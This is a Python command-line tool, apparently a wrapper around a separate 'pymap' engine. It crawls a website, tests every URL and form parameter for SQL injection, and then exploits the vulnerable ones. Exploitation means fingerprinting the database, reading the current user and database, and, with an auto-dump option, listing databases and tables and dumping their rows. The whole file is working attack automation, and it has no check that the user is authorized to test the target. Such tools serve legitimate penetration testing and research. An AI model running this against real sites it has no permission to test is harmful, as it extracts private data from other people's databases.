#!/usr/bin/env python3
"""
pyscan — find SQL injection across a website, then exploit it.

Pipeline:
  1. CRAWL   the target site (same host), collecting URLs with parameters, HTML forms
             and sitemap.xml entries (depth- and page-limited, polite delay).
  2. SCAN    every collected parameter with pymap's detection engine
             (error / boolean / time / UNION, controls + voting).
  3. EXPLOIT each vulnerable parameter: fingerprint DBMS, banner, current db/user,
             optionally enumerate databases/tables and dump proof rows.

Usage:
  python3 pyscan.py --url http://target/                       # scan only
  python3 pyscan.py --url http://target/ --exploit             # scan + fingerprint
  python3 pyscan.py --url http://target/ --exploit --auto-dump # scan + dump proof
  python3 pyscan.py -l urls.txt --exploit                      # scan URL list
"""
import argparse
import json
import os
import re
import sys
import time
import urllib.parse
from collections import deque
from datetime import datetime, timezone
from html.parser import HTMLParser

import requests

import pymap
from pymap import (CONTEXTS, Detector, Dialect, HttpClient, Injection, Target,
                   log, evidence, print_table, save_csv)

DEFAULT_UA = "pymap-scanner/1.0"


# ---------------------------------------------------------------- crawler
class LinkParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.links, self.forms = [], []
        self._form = None

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "a" and a.get("href"):
            self.links.append(a["href"])
        elif tag == "form":
            self._form = {"action": a.get("action", ""), "method": a.get("method", "get").lower()}
        elif tag in ("input", "select", "textarea") and self._form is not None:
            if a.get("name"):
                self._form.setdefault("fields", []).append(a["name"])

    def handle_endtag(self, tag):
        if tag == "form" and self._form is not None:
            self.forms.append(self._form)
            self._form = None


def crawl(start_url, max_pages, delay, ua, timeout):
    """Breadth-first crawl of the same host; returns list of candidate request dicts."""
    origin = urllib.parse.urlsplit(start_url)
    base = f"{origin.scheme}://{origin.netloc}"
    seen_pages, candidates = set(), []
    queue = deque([(start_url, 0)])
    sess = requests.Session()
    sess.headers["User-Agent"] = ua

    def add_candidate(url, method="GET", data=None, note=""):
        q = urllib.parse.urlsplit(url)
        if not q.query and not data:
            return
        candidates.append({"url": base + q.path, "qs": q.query, "method": method,
                            "data": data, "note": note})

    while queue and len(seen_pages) < max_pages:
        url, depth = queue.popleft()
        norm = url.split("#")[0]
        if norm in seen_pages:
            continue
        seen_pages.add(norm)
        try:
            r = sess.get(url, timeout=timeout)
        except requests.RequestException:
            continue
        if delay:
            time.sleep(delay)
        if "text/html" not in (r.headers.get("Content-Type") or ""):
            continue

        p = LinkParser()
        try:
            p.feed(r.text)
        except Exception:
            pass
        for href in p.links:
            href = href.strip()
            if not href or href.startswith(("javascript:", "mailto:", "tel:", "#")):
                continue
            absu = urllib.parse.urljoin(url, href)
            parts = urllib.parse.urlsplit(absu)
            if parts.netloc != origin.netloc:
                continue
            absu = f"{parts.scheme}://{parts.netloc}{parts.path}" + \
                   (f"?{parts.query}" if parts.query else "")
            if parts.query:
                add_candidate(absu, note="link")
            if depth < 3 and absu not in seen_pages:
                queue.append((absu, depth + 1))
        for form in p.forms:
            action = urllib.parse.urljoin(url, form["action"] or url)
            parts = urllib.parse.urlsplit(action)
            action = f"{parts.scheme}://{parts.netloc}{parts.path}"
            fields = form.get("fields", [])
            if not fields:
                continue
            data = "&".join(f"{f}=1" for f in fields)
            if form["method"] == "post":
                candidates.append({"url": action, "qs": "", "method": "POST",
                                   "data": data, "note": "form"})
            else:
                candidates.append({"url": action, "qs": data, "method": "GET",
                                   "data": None, "note": "form"})

    # sitemap.xml bonus
    try:
        sm = sess.get(base + "/sitemap.xml", timeout=timeout)
        if sm.ok:
            for loc in re.findall(r"<loc>([^<]+)</loc>", sm.text)[: max_pages]:
                if "?" in loc:
                    add_candidate(loc, note="sitemap")
    except requests.RequestException:
        pass

    # dedupe by (path, method, param names)
    seen, uniq = set(), []
    for c in candidates:
        key = (c["url"], c["method"], tuple(sorted(
            p.split("=")[0] for p in (c["qs"] + "&" + (c["data"] or "")).split("&") if p)))
        if key not in seen:
            seen.add(key)
            uniq.append(c)
    return uniq


# ---------------------------------------------------------------- scan one candidate
def scan_candidate(cand, opts):
    """Run pymap detection against one crawled candidate. Returns injection or None."""
    url = cand["url"] + ("?" + cand["qs"] if cand["qs"] else "")
    o = argparse.Namespace(
        url=url, data=cand["data"], cookie=opts.cookie, header=None,
        method=cand["method"], level=1, risk=opts.risk, technique=opts.technique,
        tamper=[], delay=opts.delay, timeout=opts.timeout, retries=1,
        time_sec=opts.time_sec, user_agent=opts.user_agent, proxy=opts.proxy,
        insecure=opts.insecure, output_dir=opts.output_dir, batch=True, verbose=0)
    pm = pymap.Pymap(o)
    pm._baseline()
    if pm.t.baseline.status >= 500:
        return None
    det = Detector(pm.client, pm.t, o)
    for location, name, orig in pm.t.candidates(1):
        if orig == "":
            orig = "1"
        inj, _ = det.run(location, name, orig, list(opts.technique), risk=opts.risk)
        if inj:
            pm.injectables.append(inj)
            return pm
    return None


def exploit_candidate(pm, opts):
    """Fingerprint + banner + current db/user (+ optional dump proof)."""
    out = {}
    try:
        pm.prepare_extractor()
    except Exception as e:
        return {"error": str(e)}
    out.update(dbms=pm.dbms, banner=pm.banner, current_db=pm.current_db,
              current_user=pm.current_user,
              techniques=list(pm.injectables[0].techniques.keys()))
    if opts.auto_dump:
        try:
            ex = pm.safe_extract
            dbs = [d.strip() for d in (ex(pm.dialect.q_dbs()) or "").split(",") if d.strip()]
            dbs = [d for d in dbs if d.lower() not in pymap.SYS_DBS] if opts.exclude_sysdbs else dbs
            out["databases"] = dbs
            dumped = {}
            for db in dbs[: opts.max_dbs]:
                dbq = None if pm.dbms == "SQLite" else db
                tbls = [t.strip() for t in (ex(pm.dialect.q_tables(dbq or "main")) or "").split(",") if t.strip()]
                for tbl in tbls[: opts.max_tables]:
                    if tbl.lower() in ("sqlite_master", "sqlite_sequence"):
                        continue
                    try:
                        pm.dump_table(dbq, tbl, None, 3)
                        dumped[f"{db}.{tbl}"] = True
                    except Exception:
                        pass
            out["dumped"] = dumped
        except Exception as e:
            out["dump_error"] = str(e)
    return out


# ---------------------------------------------------------------- main
def main():
    ap = argparse.ArgumentParser(prog="pyscan",
                                description="find SQLi across a website and exploit it")
    ap.add_argument("--url", help="start URL to crawl")
    ap.add_argument("-l", "--list", help="file with URLs to scan (no crawling)")
    ap.add_argument("--max-pages", type=int, default=25, help="crawl page limit (default 25)")
    ap.add_argument("--crawl-delay", type=float, default=0.2, help="politeness delay")
    ap.add_argument("--delay", type=float, default=0, help="delay between test requests")
    ap.add_argument("--timeout", type=float, default=20)
    ap.add_argument("--time-sec", type=int, default=5)
    ap.add_argument("--risk", type=int, default=1)
    ap.add_argument("--technique", default="UEB",
                   help="scan techniques (default UEB; T is slow - add it explicitly)")
    ap.add_argument("--cookie", help="cookie header")
    ap.add_argument("--user-agent", default=DEFAULT_UA)
    ap.add_argument("--proxy")
    ap.add_argument("--insecure", action="store_true")
    ap.add_argument("--exploit", action="store_true", help="fingerprint confirmed injections")
    ap.add_argument("--auto-dump", action="store_true", help="dump proof rows (needs --exploit)")
    ap.add_argument("--max-dbs", type=int, default=2, help="dbs to dump with --auto-dump")
    ap.add_argument("--max-tables", type=int, default=3, help="tables per db to dump")
    ap.add_argument("--exclude-sysdbs", action="store_true", default=True)
    ap.add_argument("--output-dir", default="./pyscan-output")
    ap.add_argument("-v", "--verbose", type=int, default=1)
    opts = ap.parse_args()

    pymap.VERBOSE = opts.verbose
    opts.technique = opts.technique.upper()

    print(pymap.BANNER)
    log(0, f"[*] pyscan starting at {datetime.now(timezone.utc).isoformat()}")

    # ---- 1. gather targets
    if opts.url:
        log(0, f"[*] crawling {opts.url} (max {opts.max_pages} pages)...")
        candidates = crawl(opts.url, opts.max_pages, opts.crawl_delay,
                          opts.user_agent, opts.timeout)
        log(0, f"[+] crawl done: {len(candidates)} unique parameterized endpoints")
        for c in candidates:
            log(1, f"    {c['method']} {c['url']}{'?' + c['qs'] if c['qs'] else ''} "
                   f"{'data=' + c['data'] if c['data'] else ''} ({c['note']})")
    elif opts.list:
        with open(opts.list) as f:
            candidates = []
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                u = urllib.parse.urlsplit(line)
                candidates.append({"url": f"{u.scheme}://{u.netloc}{u.path}",
                                   "qs": u.query, "method": "GET", "data": None,
                                   "note": "list"})
    else:
        ap.error("need --url or -l <file>")

    if not candidates:
        log(0, "[!] no parameterized endpoints found")
        return 1

    # ---- 2. scan + 3. exploit
    os.makedirs(opts.output_dir, exist_ok=True)
    results = []
    for i, cand in enumerate(candidates, 1):
        url = cand["url"] + ("?" + cand["qs"] if cand["qs"] else "")
        log(0, f"\n[{i}/{len(candidates)}] scanning {cand['method']} {url}"
               + (f" data={cand['data']}" if cand["data"] else ""))
        try:
            pm = scan_candidate(cand, opts)
        except Exception as e:
            log(1, f"    [-] scan error: {e}")
            pm = None
        if not pm:
            log(0, "    [-] not vulnerable")
            continue
        inj = pm.injectables[0]
        log(0, f"    [+] VULNERABLE: param '{inj.param}' via {','.join(inj.techniques)}")
        row = {"url": url, "method": cand["method"], "data": cand["data"],
               "param": inj.param, "location": inj.location,
               "context": inj.context.name,
               "techniques": list(inj.techniques.keys())}
        if opts.exploit:
            log(0, "    [*] exploiting...")
            row["exploit"] = exploit_candidate(pm, opts)
        results.append(row)

    # ---- report
    print("\n" + "=" * 70)
    log(0, f"SCAN COMPLETE: {len(results)}/{len(candidates)} endpoints vulnerable\n")
    if results:
        print_table(["#", "method", "url", "param", "techniques", "dbms"],
                    [[i + 1, r["method"], r["url"][:44], r["param"],
                      ",".join(r["techniques"]),
                      (r.get("exploit") or {}).get("dbms", "-")] for i, r in enumerate(results)])
    out = {"scan": datetime.now(timezone.utc).isoformat(),
           "start_url": opts.url, "candidates": len(candidates), "vulnerable": results}
    path = os.path.join(opts.output_dir, "report.json")
    with open(path, "w") as f:
        json.dump(out, f, indent=2)
    with open(os.path.join(opts.output_dir, "evidence.jsonl"), "w") as f:
        for row in pymap._EVIDENCE:
            f.write(json.dumps(row) + "\n")
    log(0, f"[*] report: {path}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
